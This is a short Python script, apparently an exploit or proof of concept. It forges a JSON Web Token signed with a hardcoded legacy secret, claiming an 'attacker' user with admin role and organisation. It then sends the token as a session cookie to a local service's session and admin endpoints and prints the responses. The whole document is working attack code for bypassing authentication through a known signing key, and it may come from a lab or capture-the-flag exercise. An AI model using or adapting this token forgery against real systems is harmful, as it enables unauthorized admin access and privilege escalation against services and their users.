import base64, hmac, hashlib, json, time, urllib.request, urllib.error

key = 'axiom-auth-hs256-legacy-2019'
now = int(time.time())
header = {'alg': 'HS256', 'typ': 'JWT'}
payload = {
    'sub': 'attacker',
    'name': 'Attacker Admin',
    'role': 'admin',
    'org': 'org_admin',
    'iss': 'axiom-auth',
    'iat': now,
    'exp': now + 3600
}

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

msg = b64url(json.dumps(header, separators=(',', ':')).encode()) + '.' + b64url(json.dumps(payload, separators=(',', ':')).encode())
sig = b64url(hmac.new(key.encode(), msg.encode(), hashlib.sha256).digest())
token = msg + '.' + sig
print('TOKEN:', token)

url = 'http://127.0.0.1:8973/api/session'
req = urllib.request.Request(url, headers={'Cookie': f'axm_session={token}'})
try:
    resp = urllib.request.urlopen(req, timeout=5)
    print('STATUS', resp.status)
    body = resp.read().decode()
    print(body[:500])
except urllib.error.HTTPError as e:
    print('HTTP ERROR', e.code)
    print(e.read().decode()[:500])
except Exception as e:
    print('ERROR', e)

# also test /admin
url2 = 'http://127.0.0.1:8973/admin'
req2 = urllib.request.Request(url2, headers={'Cookie': f'axm_session={token}'})
try:
    resp2 = urllib.request.urlopen(req2, timeout=5)
    print('ADMIN STATUS', resp2.status)
    print(resp2.read().decode()[:500])
except urllib.error.HTTPError as e:
    print('ADMIN HTTP ERROR', e.code)
    print(e.read().decode()[:500])
except Exception as e:
    print('ADMIN ERROR', e)
